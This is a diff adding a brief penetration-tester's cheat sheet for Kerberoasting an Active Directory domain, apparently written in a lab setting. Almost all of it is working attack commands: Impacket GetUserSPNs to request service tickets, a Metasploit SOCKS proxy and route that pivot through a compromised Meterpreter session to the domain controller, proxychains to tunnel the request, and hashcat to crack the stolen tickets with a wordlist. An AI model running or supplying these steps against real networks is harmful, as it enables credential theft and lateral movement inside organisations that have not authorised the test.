@@ -1,0 +1,16 @@
+impacket-GetUserSPNS -request -dc-ip <ip> <domain>/<user>
+
+Need an established meterpeter session.
+Next, we set a route in Metasploit to cover the internal subnet that contains the IP address of a Domain Controller.
+msf auxiliary/server/socks4a
+route add <subnet>
+set srvrport 8080
+run
+
+Now we are all set to use one of the Impacket example scripts and a valid and unprivileged domain account to gather Kerberos tickets advertised via SPN using proxychains over the meterpreter session.
+proxychains GetUserSPNs.py -request -dc-ip 192.168.2.160 lab.local/zuul
+
+Any Kerberos tickets gathered by the GetUserSPNs script directly crackable with Hashcat without any additional conversion (the hash type was added in version 3.0).
+hashcat -m 13100 -a 0 sqladmin_kerberos.txt crackstation.txt
+
+https://github.com/nidem/kerberoast
